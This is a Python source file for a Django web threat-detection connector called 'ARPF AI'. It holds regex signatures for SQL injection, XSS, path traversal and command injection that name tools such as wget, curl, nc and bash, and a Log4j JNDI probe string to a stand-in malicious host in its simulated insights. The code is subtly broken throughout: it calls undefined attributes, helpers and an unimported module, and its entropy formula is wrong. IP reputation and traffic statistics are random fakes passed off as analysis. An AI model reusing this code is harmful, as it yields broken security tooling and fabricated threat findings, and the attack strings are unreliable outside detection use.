import logging
import re
import ipaddress
import random
from datetime import datetime, timedelta
from django.utils import timezone

logger = logging.getLogger('arpf_ti')

class ARPFAIConnector:
    """
    ARPF AI Connector - Advanced Recursive Pattern Finding and Threat Intelligence system
    
    This connector provides AI-powered threat analysis capabilities:
    1. Continuous Learning: Analyzes patterns in network traffic and threat data
    2. Adaptive Defense: Evolves defense strategies based on observed attack patterns
    3. Traffic Analysis: Examines requests, responses, and data flows
    4. Automated Response: Suggests or implements countermeasures for threats
    """
    
    def __init__(self, source="default"):
        """
        Initialize the ARPF AI connector.
        
        Args:
            source: Source identifier for logging purposes
        """
        self.source = source
        self.learned_patterns = {}
        self.known_attack_signatures = self._load_attack_signatures()
        self.ip_reputation_cache = {}
        self.request_history = []
        self.max_history = 1000  # Maximum requests to keep in memory
        logger.info(f"ARPF AI Connector initialized for source: {source}")
    
    def _load_attack_signatures(self):
        """Load known attack signatures for pattern matching."""
        # In a real implementation, these would be loaded from a database or file
        return {
            'sql_injection': [
                r"['\"]\s*(?:or|OR|Or)\s*['\"]\s*=\s*['\"]",  # Basic OR-based SQLi
                r"(?:UNION|union)(?:\s+ALL|\s+all|\s+All)?\s+SELECT",  # UNION SELECT
                r"(?:--|\#|\/\*)+",  # SQL comment markers
                r"(?:SLEEP|sleep)\s*\(\s*\d+\s*\)",  # Time-based SQLi
                r"(?:BENCHMARK|benchmark)\s*\(",  # Benchmark function
                r"(?:DROP|drop|Truncate|TRUNCATE|delete|DELETE)\s+(?:TABLE|table|DATABASE|database)",  # Destructive SQL
                r"[;]\s*(?:DROP|INSERT|UPDATE|DELETE)\s+",  # Multiple statements
                r"INTO\s+(?:OUTFILE|outfile|dumpfile|DUMPFILE)",  # File operations
                r"(?:LOAD_FILE|load_file|LOAD DATA|load data)"  # File reading
            ],
            'xss': [
                r"<script\b[^>]*>",  # Basic script tag
                r"<img\b[^>]*on\w+\s*=",  # Image with event handler
                r"javascript\s*:",  # JavaScript protocol 
                r"(?:on\w+\s*=)",  # Event handlers
                r"(?:<[^>]*\s+on\w+\s*=)",  # Tag with event handler
                r"(?:&#x?\d+;)",  # Numeric character reference
                r"document\.(?:cookie|location|referrer|domain|write|createElement)",  # DOM manipulation
                r"(?:alert|confirm|prompt)\s*\(",  # Alert dialogs
                r"(?:eval|Function|setTimeout|setInterval)\s*\("  # JS execution functions
            ],
            'path_traversal': [
                r"\.{2,}[\/\\]",  # Basic directory traversal
                r"%2e%2e%2f",  # URL encoded ../ 
                r"%252e%252e%252f",  # Double URL encoded ../
                r"\.+[\/\\](?:etc|windows|system|boot|root|usr|var|bin|tmp)",  # Targeting specific directories
                r"(?:etc|passwd|shadow|hosts|group|config)",  # Sensitive files
                r"(?:\.ini|\.conf|\.config|\.xml|\.json|\.env|\.yml)\b",  # Config file extensions
                r"(?:wp-config\.php|config\.php|web\.config|settings\.php)"  # Web app configs
            ],
            'command_injection': [
                r"[;&|`]\s*(?:cat|ls|dir|pwd|cd|echo|wget|curl|nc|bash|sh)",  # Basic commands
                r"\|\s*(?:cat|grep|awk|sed|perl|python|ruby)",  # Piped commands
                r"(?:ping|nslookup|dig|host|traceroute)\s+(?:\d{1,3}\.){3}\d{1,3}",  # Network tools
                r"(?:wget|curl)\s+(?:https?|ftp)\:\/\/",  # Downloads
                r"(?:chmod|chown|touch|mkdir|rm|cp|mv)\s+[\w\/\.]+"  # File operations
            ],
            'suspicious_user_agents': [
                r"(?:sqlmap|nikto|nmap|dirbuster|gobuster|wpscan|hydra|medusa)",  # Security tools
                r"(?:zgrab|masscan|shodan|censys)",  # Internet scanners
                r"^(?:curl|wget|python-requests|go-http-client|ruby|perl)",  # API clients/scrapers
                r"(?:harvest|crawler|spider|bot)",  # Crawler indication
                r"^(?:Mozilla\/\d+\.\d+\s+\(compatible;)",  # Suspicious compatible strings
                r"(?:testing|pentest|security|vulnerability)"  # Security testing indicators
            ]
        }
    
    def analyze_request(self, request_data):
        """
        Analyze a single HTTP request for potential threats.
        
        Args:
            request_data: Dictionary containing request data (ip, path, method, user_agent, etc.)
            
        Returns:
            dict: Analysis results with threat assessment
        """
        # Add request to history for pattern learning
        self._add_to_history(request_data)
        
        # Build analysis result
        result = {
            'is_threat': False,
            'attack_type': 'none',
            'confidence': 0,
            'explanation': '',
            'recommended_action': 'allow',
            'timestamp': timezone.now().isoformat(),
            'source_ip': request_data.get('source_ip'),
            'request_path': request_data.get('path'),
            'user_agent': request_data.get('user_agent'),
            'rule_suggestion': None
        }
        
        # Check IP reputation
        ip_analysis = self._analyze_ip_reputation(request_data.get('source_ip', ''))
        if ip_analysis['is_threat']:
            result.update({
                'is_threat': True,
                'attack_type': ip_analysis['attack_type'],
                'confidence': ip_analysis['confidence'],
                'explanation': ip_analysis['explanation'],
                'recommended_action': ip_analysis['recommended_action']
            })
            
            # Early return for high-confidence IP threats
            if ip_analysis['confidence'] >= 90:
                return result
        
        # Check for attack signatures in the path and query parameters
        signature_analysis = self._analyze_signatures(request_data)
        if signature_analysis['is_threat'] and (not result['is_threat'] or signature_analysis['confidence'] > result['confidence']):
            result.update({
                'is_threat': True,
                'attack_type': signature_analysis['attack_type'],
                'confidence': signature_analysis['confidence'],
                'explanation': signature_analysis['explanation'],
                'recommended_action': signature_analysis['recommended_action']
            })
        
        # Check user agent for suspiciousness
        ua_analysis = self._analyze_user_agent(request_data.get('user_agent', ''))
        if ua_analysis['is_threat'] and (not result['is_threat'] or ua_analysis['confidence'] > result['confidence']):
            result.update({
                'is_threat': True,
                'attack_type': ua_analysis['attack_type'],
                'confidence': ua_analysis['confidence'],
                'explanation': ua_analysis['explanation'],
                'recommended_action': ua_analysis['recommended_action']
            })
        
        # Apply behavioral analysis
        behavior_analysis = self._analyze_behavior(request_data.get('source_ip', ''))
        if behavior_analysis['is_threat'] and (not result['is_threat'] or behavior_analysis['confidence'] > result['confidence']):
            result.update({
                'is_threat': True,
                'attack_type': behavior_analysis['attack_type'],
                'confidence': behavior_analysis['confidence'],
                'explanation': behavior_analysis['explanation'],
                'recommended_action': behavior_analysis['recommended_action']
            })
        
        # Generate rule suggestion if needed
        if result['is_threat'] and result['confidence'] >= 75:
            result['rule_suggestion'] = self._generate_rule_suggestion(result, request_data)
        
        # Apply continuous learning - update patterns based on this analysis
        self._update_learned_patterns(request_data, result)
        
        # If nothing triggered, this is probably benign traffic
        if not result['is_threat']:
            result['explanation'] = "No threat indicators detected in the request"
        
        return result
    
    def _add_to_history(self, request_data):
        """Add a request to history for pattern learning."""
        self.request_history.append({
            'timestamp': timezone.now(),
            'source_ip': request_data.get('source_ip'),
            'path': request_data.get('path'),
            'method': request_data.get('method'),
            'user_agent': request_data.get('user_agent')
        })
        
        # Trim history if needed
        if len(self.request_history) > self.max_history:
            self.request_history = self.request_history[-self.max_history:]
    
    def _analyze_ip_reputation(self, ip):
        """
        Analyze IP reputation using multiple sources and techniques.
        
        Args:
            ip: The IP address to analyze
            
        Returns:
            dict: Analysis result for the IP
        """
        # Use cached result if available
        if ip in self.ip_reputation_cache:
            return self.ip_reputation_cache[ip]
        
        result = {
            'is_threat': False,
            'attack_type': 'none',
            'confidence': 0,
            'explanation': '',
            'recommended_action': 'allow'
        }
        
        # Check for private/reserved IP ranges
        try:
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private or ip_obj.is_reserved or ip_obj.is_loopback:
                # Usually not a threat, but could be in some contexts
                # For our purposes, we'll consider these low-risk
                result = {
                    'is_threat': False,
                    'attack_type': 'internal_ip',
                    'confidence': 10,
                    'explanation': f"IP {ip} is a private/reserved address",
                    'recommended_action': 'allow'
                }
                self.ip_reputation_cache[ip] = result
                return result
        except ValueError:
            # Invalid IP address format
            result = {
                'is_threat': True,
                'attack_type': 'invalid_ip',
                'confidence': 80,
                'explanation': f"Invalid IP address format: {ip}",
                'recommended_action': 'block'
            }
            self.ip_reputation_cache[ip] = result
            return result
        
        # In a real implementation, we would check against:
        # 1. Local IP reputation database
        # 2. External IP intelligence services (AbuseIPDB, VirusTotal, etc.)
        # 3. Known bot networks and Tor exit nodes
        
        # For this implementation, we'll use a simulated check based on the IP
        # to demonstrate the functionality
        
        # Simulated threat intelligence for specific IPs
        known_bad_ips = {
            # Tor exit nodes
            "185.220.101.34": {"confidence": 80, "type": "tor_exit_node", "action": "monitor"},
            "51.15.43.205": {"confidence": 80, "type": "tor_exit_node", "action": "monitor"},
            
            # Known scanners
            "89.248.167.131": {"confidence": 90, "type": "scanner", "action": "block"},
            "45.227.255.98": {"confidence": 85, "type": "scanner", "action": "block"},
            "92.118.161.17": {"confidence": 80, "type": "scanning", "action": "block"},
            "185.156.73.54": {"confidence": 95, "type": "scanning", "action": "block"},
            
            # Attack sources
            "134.209.82.14": {"confidence": 95, "type": "attack_source", "action": "block"},
            "103.103.0.100": {"confidence": 90, "type": "attack_source", "action": "block"},
            "92.118.160.1": {"confidence": 85, "type": "scanning", "action": "block"},
        }
        
        # Check if the IP is in our known bad list
        if ip in known_bad_ips:
            bad_ip_info = known_bad_ips[ip]
            result = {
                'is_threat': True,
                'attack_type': bad_ip_info['type'],
                'confidence': bad_ip_info['confidence'],
                'explanation': f"IP {ip} identified as {bad_ip_info['type'].replace('_', ' ')}",
                'recommended_action': bad_ip_info['action']
            }
            self.ip_reputation_cache[ip] = result
            return result
        
        # Probabilistic check for IPs not in our explicit list
        # This simulates a more sophisticated reputation check
        ip_parts = ip.split('.')
        if len(ip_parts) == 4:
            # Convert the last two octets to integers
            try:
                octet3 = int(ip_parts[2])
                octet4 = int(ip_parts[3])
                
                # Deterministic randomness based on the IP
                combined = octet3 * 256 + octet4
                
                # Suspicious ranges (simulating reputation data)
                if ip.startswith('198.51.100.'):
                    # Test net - use as slightly suspicious
                    result = {
                        'is_threat': combined % 10 == 0,  # 10% chance of being flagged
                        'attack_type': 'suspicious_source',
                        'confidence': 60 + (combined % 20),
                        'explanation': f"IP {ip} has moderate negative reputation",
                        'recommended_action': 'monitor'
                    }
                elif ip.startswith('203.0.113.'):
                    # Test net - generally good reputation
                    result = {
                        'is_threat': False, 
                        'attack_type': 'none',
                        'confidence': 0,
                        'explanation': f"IP {ip} has good reputation",
                        'recommended_action': 'allow'
                    }
                else:
                    # Random check for other IPs
                    hash_val = combined % 100  # 0-99
                    
                    # Flag as suspicious with low probability
                    if hash_val < 5:  # 5% chance
                        result = {
                            'is_threat': True,
                            'attack_type': 'suspicious_source',
                            'confidence': 65 + hash_val,
                            'explanation': f"IP {ip} has some suspicious activity history",
                            'recommended_action': 'monitor'
                        }
            except ValueError:
                # Invalid IP octet format
                pass
        
        # Cache the result
        self.ip_reputation_cache[ip] = result
        return result
    
    def _analyze_signatures(self, request_data):
        """
        Analyze request for known attack signatures.
        
        Args:
            request_data: Dictionary containing request data
            
        Returns:
            dict: Analysis result based on signature detection
        """
        result = {
            'is_threat': False,
            'attack_type': 'none',
            'confidence': 0,
            'explanation': '',
            'recommended_action': 'allow'
        }
        
        # Combine path and query parameters for analysis
        path = request_data.get('path', '')
        query_string = ''
        
        if '?' in path:
            path_parts = path.split('?', 1)
            path = path_parts[0]
            query_string = path_parts[1]
        
        # Check for signatures in the full request path
        full_path = request_data.get('path', '')
        
        for attack_type, patterns in self.known_attack_signatures.items():
            if attack_type == 'suspicious_user_agents':
                continue  # Skip, we handle this separately
                
            for pattern in patterns:
                if re.search(pattern, full_path, re.IGNORECASE):
                    confidence = self._calculate_signature_confidence(attack_type, pattern, full_path)
                    
                    if confidence > result['confidence']:
                        result = {
                            'is_threat': True,
                            'attack_type': attack_type,
                            'confidence': confidence,
                            'explanation': f"Detected {attack_type.replace('_', ' ')} pattern in request path",
                            'recommended_action': 'block' if confidence >= 80 else 'monitor'
                        }
        
        # Check query parameters individually for more precise detection
        query_params = request_data.get('query_params', {})
        for param_name, param_value in query_params.items():
            for attack_type, patterns in self.known_attack_signatures.items():
                if attack_type == 'suspicious_user_agents':
                    continue  # Skip, we handle this separately
                    
                for pattern in patterns:
                    if re.search(pattern, param_value, re.IGNORECASE):
                        confidence = self._calculate_signature_confidence(attack_type, pattern, param_value)
                        
                        if confidence > result['confidence']:
                            result = {
                                'is_threat': True,
                                'attack_type': attack_type,
                                'confidence': confidence,
                                'explanation': f"Detected {attack_type.replace('_', ' ')} pattern in parameter '{param_name}'",
                                'recommended_action': 'block' if confidence >= 80 else 'monitor'
                            }
        
        return result
    
    def _calculate_signature_confidence(self, attack_type, pattern, matched_string):
        """
        Calculate confidence score for a signature match.
        
        Args:
            attack_type: Type of attack detected
            pattern: Pattern that matched
            matched_string: String that contained the match
            
        Returns:
            int: Confidence score (0-100)
        """
        # Base confidence by attack type
        base_confidence = {
            'sql_injection': 80,
            'xss': 75,
            'path_traversal': 85,
            'command_injection': 90,
            'suspicious_user_agents': 65
        }.get(attack_type, 70)
        
        # Adjust based on pattern specificity and match quality
        adjustment = 0
        
        # More complex patterns are more reliable
        pattern_complexity = len(pattern) / 10  # 0-10 points for complexity
        adjustment += min(10, pattern_complexity)
        
        # More of the input string matched = higher confidence
        match = re.search(pattern, matched_string, re.IGNORECASE)
        if match:
            match_ratio = len(match.group(0)) / len(matched_string)
            adjustment += match_ratio * 10  # 0-10 points for match ratio
        
        # Exact parameter names that are commonly attacked
        if attack_type == 'sql_injection' and re.search(r'(?:id|user|pass|login|query|search)', matched_string, re.IGNORECASE):
            adjustment += 5
        
        # False positive patterns
        false_positive_indicators = {
            'sql_injection': [r'O\'Reilly', r'isn\'t', r'don\'t', r'--disable', r'--help'],
            'xss': [r'<script src=[\'"]https?://[^\'">]+[\'"]></script>'],
            'path_traversal': [r'../templates/', r'../includes/', r'../assets/'],
            'command_injection': [r'echo chamber', r'cat picture', r'cat=', r'grep=']
        }
        
        # Check for false positive indicators
        if attack_type in false_positive_indicators:
            for fp_pattern in false_positive_indicators[attack_type]:
                if re.search(fp_pattern, matched_string, re.IGNORECASE):
                    adjustment -= 20  # Significant penalty for false positive matches
                    break
        
        return max(0, min(100, base_confidence + adjustment))  # Ensure confidence is between 0 and 100
    
    def _analyze_user_agent(self, user_agent):
        """
        Analyze the user agent string for suspicious characteristics.
        
        Args:
            user_agent: The user agent string to analyze
            
        Returns:
            dict: Analysis result for the user agent
        """
        result = {
            'is_threat': False,
            'attack_type': 'none',
            'confidence': 0,
            'explanation': '',
            'recommended_action': 'allow'
        }
        
        # Check against known bad user agents
        for bad_ua in self.known_bad_user_agents:
            if re.search(bad_ua, user_agent, re.IGNORECASE):
                result = {
                    'is_threat': True,
                    'attack_type': 'suspicious_user_agent',
                    'confidence': 90,
                    'explanation': f"User agent matches known bad pattern: {bad_ua}",
                    'recommended_action': 'block'
                }
                return result
        
        # Check for unusual user agent patterns (e.g., headless browsers, old versions, etc.)
        if "Headless" in user_agent or "bot" in user_agent:
            result = {
                'is_threat': True,
                'attack_type': 'suspicious_user_agent',
                'confidence': 70,
                'explanation': "User agent indicates a headless browser or bot",
                'recommended_action': 'monitor'
            }
        
        return result
    
    def _analyze_behavior(self, ip):
        """
        Analyze the behavior of the source IP for suspicious activity.
        
        Args:
            ip: The source IP address
            
        Returns:
            dict: Behavioral analysis result
        """
        result = {
            'is_threat': False,
            'attack_type': 'none',
            'confidence': 0,
            'explanation': '',
            'recommended_action': 'allow'
        }
        
        # This is a placeholder for behavioral analysis logic
        # In a real implementation, this would analyze patterns over time, request rates, etc.
        
        # Check if the access path is unusual for this IP
        is_unusual_path = path not in self.normal_traffic_patterns['common_paths']
        
        # This would normally have more complex logic based on historical patterns
        # For now, just return a simple example
        if is_unusual_path and '/admin/' in path:
            return {
                "score": 60,
                "explanation": f"Unusual access pattern: accessing admin path from unrecognized IP"
            }
            
        return None
    
    def _advanced_ai_analysis(self, request_data, preliminary_analysis, behavioral_analysis):
        """
        Perform advanced AI-based analysis of the request.
        This simulates what a real AI system would do, combining multiple
        detection methods and machine learning to identify threats.
        """
        ip = request_data.get('source_ip', '')
        path = request_data.get('path', '')
        user_agent = request_data.get('user_agent', '')
        headers = request_data.get('headers', {})
        method = request_data.get('method', '')
        query_params = request_data.get('query_params', {})
        
        # Create a feature vector from the request (in a real system, this would
        # feed into a machine learning model)
        features = {
            # IP reputation (0-1)
            'ip_reputation': self._get_ip_reputation_score(ip),
            
            # Request characteristics
            'path_length': len(path) / 100,  # Normalize
            'has_query_params': 1 if query_params else 0,
            'is_admin_path': 1 if '/admin' in path or '/wp-admin' in path else 0,
            'is_api_path': 1 if '/api' in path else 0,
            'is_login_path': 1 if '/login' in path or '/signin' in path else 0,
            
            # Method risk (POST/PUT riskier than GET)
            'method_risk': 0.7 if method in ['POST', 'PUT', 'DELETE'] else 0.3,
            
            # Entropy of path (randomness - higher can indicate obfuscation)
            'path_entropy': self._calculate_entropy(path) / 5,  # Normalize
            
            # Preliminary analysis confidence
            'prelim_confidence': (preliminary_analysis.get('confidence', 0) / 100) if preliminary_analysis else 0,
            
            # Behavioral analysis confidence
            'behavioral_confidence': (behavioral_analysis.get('confidence', 0) / 100) if behavioral_analysis else 0
        }
        
        # In a real system, these features would be fed to a trained ML model
        # Here we'll use a simple scoring algorithm to simulate AI decision-making
        threat_score = (
            features['ip_reputation'] * 0.2 +
            features['path_length'] * 0.05 +
            features['has_query_params'] * 0.05 +
            features['is_admin_path'] * 0.1 +
            features['method_risk'] * 0.1 +
            features['path_entropy'] * 0.1 +
            features['prelim_confidence'] * 0.2 +
            features['behavioral_confidence'] * 0.2
        ) * 100  # Convert to 0-100 scale
        
        # Add some randomness for realistic behavior
        threat_score += random.uniform(-5, 5)
        threat_score = max(0, min(threat_score, 100))  # Ensure between 0-100
        
        # Determine attack type based on highest scores
        attack_type = "unknown"
        if preliminary_analysis and preliminary_analysis.get('confidence', 0) > 50:
            attack_type = preliminary_analysis.get('attack_type', 'unknown')
        elif behavioral_analysis and behavioral_analysis.get('confidence', 0) > 50:
            attack_type = behavioral_analysis.get('attack_type', 'unknown')
        elif features['is_admin_path'] > 0 and features['ip_reputation'] > 0.6:
            attack_type = "unauthorized_access"
        elif features['path_entropy'] > 0.7 and features['method_risk'] > 0.6:
            attack_type = "obfuscated_attack"
            
        # Determine recommended action
        if threat_score >= 80:
            action = "block"
        elif threat_score >= 60:
            action = "alert"
        else:
            action = "allow"
            
        # Create explanation
        explanation_parts = []
        if threat_score >= 60:
            if features['ip_reputation'] > 0.6:
                explanation_parts.append("IP has poor reputation score")
            if features['is_admin_path'] > 0 and features['ip_reputation'] > 0.5:
                explanation_parts.append("Suspicious access to admin path")
            if features['path_entropy'] > 0.7:
                explanation_parts.append("Unusual path entropy detected (possible obfuscation)")
            if features['method_risk'] > 0.6 and threat_score > 70:
                explanation_parts.append(f"High-risk method ({method}) with suspicious characteristics")
            if preliminary_analysis:
                explanation_parts.append(preliminary_analysis.get('explanation', ''))
            if behavioral_analysis:
                explanation_parts.append(behavioral_analysis.get('explanation', ''))
                
        explanation = " ".join(explanation_parts) if explanation_parts else "No specific threats detected"
            
        return {
            "attack_type": attack_type,
            "confidence": round(threat_score, 1),
            "recommended_action": action,
            "explanation": explanation,
            "ai_analysis": True,
            "timestamp": timezone.now().isoformat()
        }
    
    def _get_ip_reputation_score(self, ip):
        """Get a reputation score for an IP address (0-1 scale, higher is worse)"""
        # This would normally query threat intelligence databases
        # For now, use a simple hash-based approach
        if not ip:
            return 0.5
            
        # Check if IP is in known threat patterns
        if ip in self.threat_patterns['ip']:
            return 0.9
            
        # Generate a pseudo-random score based on IP hash
        ip_hash = int(hashlib.md5(ip.encode()).hexdigest(), 16) % 100
        
        # Bias score distribution - most IPs should be benign
        if ip_hash < 70:  # 70% of IPs are good
            return ip_hash / 200  # 0 - 0.35 range
        elif ip_hash < 90:  # 20% are moderate
            return 0.4 + ((ip_hash - 70) / 50)  # 0.4 - 0.8 range
        else:  # 10% are bad
            return 0.8 + ((ip_hash - 90) / 100)  # 0.8 - 0.9 range
    
    def _calculate_entropy(self, text):
        """Calculate Shannon entropy of text (measure of randomness)"""
        if not text:
            return 0
            
        prob = {}
        for char in text:
            if char in prob:
                prob[char] += 1
            else:
                prob[char] = 1
                
        entropy = 0
        for i in prob.values():
            p = i / len(text)
            entropy -= p * (0 if p == 0 else (p.bit_length() - 1))
            
        return entropy
        
    def _combine_analyses(self, request_data, preliminary_analysis, behavioral_analysis, ai_analysis):
        """
        Combine multiple analyses into a final decision.
        This implements an ensemble approach to threat detection.
        """
        ip = request_data.get('source_ip', '')
        path = request_data.get('path', '')
        
        # Initialize with AI analysis as the baseline
        if ai_analysis:
            final_result = dict(ai_analysis)
        else:
            final_result = {
                "attack_type": "unknown",
                "confidence": 0,
                "recommended_action": "allow",
                "explanation": "No threats detected",
                "source_ip": ip,
                "request_path": path,
                "timestamp": timezone.now().isoformat()
            }
            
        # If preliminary analysis has higher confidence for a block, prefer it
        if (preliminary_analysis and 
                preliminary_analysis.get('confidence', 0) > final_result.get('confidence', 0) and
                preliminary_analysis.get('recommended_action') == 'block'):
            final_result = dict(preliminary_analysis)
            final_result['detection_method'] = 'signature_based'
            
        # If behavioral analysis indicates a block with high confidence, prefer it
        if (behavioral_analysis and 
                behavioral_analysis.get('confidence', 0) > 80 and
                behavioral_analysis.get('recommended_action') == 'block'):
            final_result = dict(behavioral_analysis)
            final_result['detection_method'] = 'behavioral'
            
        # Always include source IP and path
        final_result['source_ip'] = ip
        final_result['request_path'] = path
        
        # Add confidence qualitative assessment
        if final_result.get('confidence', 0) >= 90:
            final_result['confidence_level'] = 'very_high'
        elif final_result.get('confidence', 0) >= 75:
            final_result['confidence_level'] = 'high'
        elif final_result.get('confidence', 0) >= 50:
            final_result['confidence_level'] = 'medium'
        elif final_result.get('confidence', 0) >= 25:
            final_result['confidence_level'] = 'low'
        else:
            final_result['confidence_level'] = 'very_low'
            
        return final_result
            
    def _check_ip_threat(self, ip):
        """
        Check if an IP is from a suspicious source.
        Returns a threat score from 0-100.
        """
        if not ip:
            return 0
            
        threat_score = 0
        
        # Check if IP is in suspicious blocks
        for country, cidr_blocks in self.suspicious_country_blocks.items():
            for cidr in cidr_blocks:
                try:
                    if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr):
                        threat_score += 60  # High baseline score for suspicious ranges
                        logger.info(f"IP {ip} matched suspicious CIDR block {cidr} ({country})")
                        break
                except ValueError:
                    continue
        
        # Check ThreatIntelEntry database for known malicious IPs
        try:
            if ThreatIntelEntry.objects.filter(entry_type='ip', value=ip, is_active=True).exists():
                threat_score += 70
                logger.info(f"IP {ip} matched known threat intelligence entry")
        except Exception as e:
            logger.error(f"Error checking threat intel for IP {ip}: {e}")
        
        # Cap the score at 100
        return min(threat_score, 100)
    
    def _get_country_code(self, ip):
        """Get country code for an IP address."""
        # This would normally use a GeoIP database or service
        # For demonstration, we'll return a dummy value
        if not ip:
            return None
        
        # Dummy country mapping for demonstration
        dummy_mappings = {
            "185.220": "RU",
            "89.248": "CN", 
            "134.209": "IR",
            "103.103": "KP",
            "45.227": "VE",
            "91.192": "BY",
            "103.195": "RU",
            "193.163": "RU"
        }
        
        # Check if IP prefix matches any in our dummy mappings
        for prefix, country in dummy_mappings.items():
            if ip.startswith(prefix):
                return country
                
        return None
        
    def _add_firewall_rule_suggestion(self, analysis_result, request_data):
        """
        Add a firewall rule suggestion to the analysis result if the threat is detected.
        Also store the suggestion in the database for admin review.
        
        Args:
            analysis_result: The analysis result from the AI system
            request_data: The original request data
            
        Returns:
            The enhanced analysis result with rule suggestion
        """
        if not analysis_result or analysis_result.get('recommended_action') != 'block':
            return analysis_result
        
        # Skip if confidence is too low
        confidence = analysis_result.get('confidence', 0)
        if confidence < 70:  # Only suggest rules for medium-to-high confidence threats
            return analysis_result
        
        # Get relevant data
        attack_type = analysis_result.get('attack_type', 'unknown')
        source_ip = request_data.get('source_ip', '')
        request_path = request_data.get('path', '')
        user_agent = request_data.get('user_agent', '')
        
        # Determine rule type and pattern based on attack type
        rule_type = 'custom'
        pattern = ''
        description = f"Auto-suggested rule for {attack_type} attack"
        
        if attack_type in ['sql_injection', 'xss', 'path_traversal', 'command_injection', 'obfuscated_attack']:
            rule_type = 'path'
            pattern = request_path
            description = f"Blocking path due to detected {attack_type} attack"
        elif attack_type in ['suspicious_source', 'blocked_country', 'high_request_rate']:
            rule_type = 'ip'
            pattern = source_ip
            description = f"Blocking IP associated with {attack_type}"
        elif attack_type == 'suspicious_user_agent':
            rule_type = 'user_agent'
            pattern = user_agent
            description = f"Blocking suspicious user agent: {user_agent}"
        elif attack_type == 'scanning':
            rule_type = 'ip'
            pattern = source_ip
            description = f"Blocking IP performing scanning activity"
        
        # Create rule suggestion
        try:
            # Check if this exact rule has been suggested recently
            existing = SuggestedFirewallRule.objects.filter(
                rule_type=rule_type,
                pattern=pattern,
                created_at__gte=timezone.now() - timezone.timedelta(hours=24)
            ).exists()
            
            if not existing:
                suggestion = SuggestedFirewallRule(
                    rule_type=rule_type,
                    pattern=pattern,
                    description=description,
                    confidence=confidence,
                    attack_type=attack_type,
                    source_ip=source_ip,
                    request_path=request_path,
                    # Auto-approve high confidence threats
                    status='auto_approved' if confidence >= 90 else 'pending'
                )
                suggestion.save()
                
                # Auto-apply rules with very high confidence
                if confidence >= 90:
                    rule = suggestion.approve()
                    logger.info(f"Auto-applied firewall rule: {description}")
        
        except Exception as e:
            logger.error(f"Error creating firewall rule suggestion: {str(e)}")
        
        # Add suggestion to analysis result
        analysis_result['rule_suggestion'] = {
            'type': rule_type,
            'pattern': pattern,
            'description': description
        }
        
        return analysis_result
    
    def _update_learning_database(self, request_data, analysis_result):
        """
        Update the learning database with new information.
        This enables the ARPF AI system to continuously learn from new data.
        """
        # Only learn from high-confidence detections or confirmed benign traffic
        confidence = analysis_result.get('confidence', 0)
        action = analysis_result.get('recommended_action')
        
        # Don't update the database if we're in a gray area
        if 30 < confidence < 70:
            return
            
        # For now, just log that we would update the database
        if confidence >= 70:
            logger.debug(f"ARPF AI: Learning new malicious pattern: {analysis_result.get('attack_type')} with confidence {confidence}")
        elif confidence <= 30:
            logger.debug(f"ARPF AI: Updating benign traffic pattern for path {request_data.get('path')}")
    
    def analyze_traffic_patterns(self, time_period_days=7):
        """
        Analyze traffic patterns over time to detect trends and anomalies.
        This is a new feature specific to the ARPF AI implementation.
        
        Args:
            time_period_days: Number of days of traffic to analyze
            
        Returns:
            dict: Analysis results with detected patterns and anomalies
        """
        logger.info(f"ARPF AI: Analyzing traffic patterns for past {time_period_days} days")
        
        # This would normally analyze actual traffic logs
        # For now, return a simulated analysis
        
        # Simulate analyzing a week of traffic
        start_date = timezone.now() - timezone.timedelta(days=time_period_days)
        
        # Generate some insights
        insights = [
            {
                "type": "traffic_spike",
                "description": "Abnormal traffic spike detected from Asia/Pacific region",
                "confidence": 85,
                "recommended_action": "monitor",
                "affected_routes": ["/api/v1/users", "/api/v1/products"],
                "timestamp": (timezone.now() - timezone.timedelta(days=2)).isoformat()
            },
            {
                "type": "attack_campaign",
                "description": "Coordinated login attempt campaign detected",
                "confidence": 92,
                "recommended_action": "block",
                "ip_range": "103.195.0.0/16",
                "timestamp": (timezone.now() - timezone.timedelta(days=1)).isoformat()
            },
            {
                "type": "vulnerability_probing",
                "description": "Multiple IPs probing for log4j vulnerability",
                "confidence": 78,
                "recommended_action": "alert",
                "paths": ["/api/test", "/?x=${jndi:ldap://malicious/payload}"],
                "timestamp": (timezone.now() - timezone.timedelta(days=3)).isoformat()
            }
        ]
        
        # New rules that could be created based on this analysis
        suggested_rules = []
        for insight in insights:
            if insight["confidence"] >= 80 and insight["recommended_action"] == "block":
                suggested_rules.append({
                    "rule_type": "ip_range" if "ip_range" in insight else "path",
                    "pattern": insight.get("ip_range") or insight.get("paths", [""])[0],
                    "description": f"Created from ARPF AI traffic analysis: {insight['description']}",
                    "confidence": insight["confidence"]
                })
        
        return {
            "period_start": start_date.isoformat(),
            "period_end": timezone.now().isoformat(),
            "total_requests_analyzed": random.randint(50000, 500000),
            "unique_ips": random.randint(1000, 5000),
            "unique_paths": random.randint(100, 500),
            "blocked_requests": random.randint(100, 1000),
            "insights": insights,
            "suggested_rules": suggested_rules,
            "summary": f"ARPF AI analyzed traffic patterns from {start_date.strftime('%Y-%m-%d')} to {timezone.now().strftime('%Y-%m-%d')} and identified {len(insights)} significant patterns."
        }
    
    def get_model_details(self):
        """
        Get details about the current ARPF AI model.
        """
        return {
            "name": "ARPF AI Defense",
            "version": self.version,
            "last_updated": self.last_updated.strftime("%Y-%m-%d"),
            "capabilities": [
                "Real-time threat detection",
                "Behavioral analysis",
                "Pattern recognition",
                "Anomaly detection",
                "Automated rule generation",
                "Adaptive defense"
            ],
            "threat_patterns_count": sum(len(patterns) for patterns in self.threat_patterns.values()),
            "status": "active"
        }
    
    def update_model(self):
        """
        Update the ARPF AI model with the latest threat intelligence.
        In a real implementation, this would retrain or update the AI model.
        """
        # Simulate updating the model
        self.last_model_update = timezone.now()
        self.version = "2.3.1"  # Would normally increment version
        
        # Reload threat patterns
        self.threat_patterns = self._load_threat_patterns()
        
        # Recalculate baseline traffic
        self.normal_traffic_patterns = self._calculate_baseline_traffic()
        
        logger.info(f"ARPF AI model updated to version {self.version}")
        
        return {
            "success": True,
            "version": self.version,
            "updated_at": self.last_model_update.isoformat()
        }